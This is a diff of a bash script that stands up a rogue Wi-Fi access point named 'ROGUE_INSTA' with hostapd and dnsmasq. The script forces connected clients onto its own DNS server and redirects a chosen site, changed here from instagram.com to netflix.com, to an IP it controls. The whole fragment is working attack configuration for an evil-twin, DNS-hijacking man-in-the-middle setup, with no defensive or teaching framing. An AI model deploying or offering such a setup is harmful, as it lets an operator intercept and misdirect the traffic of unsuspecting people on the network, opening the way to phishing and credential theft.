@@ -8,19 +8,19 @@ fi
 
 # default env vars
 INTERFACE="wlan0"
-SSID="ROGUE_INSTA"
+SSID="ROGUE_INSTA_4"
 IP_RANGE="192.168.50.1/24"
 INTERNET_IFACE="eth0"
 IP_REDIRECTION=157.240.3.35 # 157.240.3.35 => facebook by default
 
 # if user choosed a custom ssid => overwrite the default one
-while getopts "s:i:" opt; do
-  case $opt in
-    s) SSID="$OPTARG";;
-    i) IP_REDIRECTION="$OPTARG";;
-    \?) echo "Invalid option -$OPTARG" >&2; exit 1;;
-  esac
-done
+# while getopts "s:i:" opt; do
+#   case $opt in
+#     s) SSID="$OPTARG";;
+#     i) IP_REDIRECTION="$OPTARG";;
+#     \?) echo "Invalid option -$OPTARG" >&2; exit 1;;
+#   esac
+# done
 
 # ensure needed packages are installed (hostapd & dnsmasq)
 if ! command -v hostapd &> /dev/null; then
@@ -58,8 +58,8 @@ cat > /etc/dnsmasq.conf <<EOF
 interface=$INTERFACE
 dhcp-range=192.168.50.10,192.168.50.100,12h
 # DNS redirections to redirection IP
-address=/instagram.com/$IP_REDIRECTION
-address=/www.instagram.com/$IP_REDIRECTION
+address=/netflix.com/$IP_REDIRECTION
+address=/www.netflix.com/$IP_REDIRECTION
 # Force clients to use our DNS
 dhcp-option=6,192.168.50.1
 EOF
